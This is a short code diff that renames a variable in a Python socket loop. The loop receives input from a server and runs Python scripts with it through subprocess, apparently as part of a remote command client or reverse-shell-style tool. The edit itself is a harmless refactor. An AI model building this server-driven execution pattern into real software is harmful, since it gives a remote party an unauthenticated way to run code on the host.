@@ -136,10 +136,10 @@ while True:
                 script = ' '.join(splited_command[1:])
                 try:
                     # receive the input from the server
-                    input = s.recv(BUFFER_SIZE).decode()
+                    input_str = s.recv(BUFFER_SIZE).decode()  # changed 'input' to 'input_str'
                     # execute the python script
                     proc = subprocess.Popen(["python3", script], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    stdout, stderr = proc.communicate(input=input.encode())
+                    stdout, stderr = proc.communicate(input=input_str.encode())  # changed 'input' to 'input_str'
                     # set the output to the script's output
                     output = stdout.decode()
                 except subprocess.CalledProcessError:
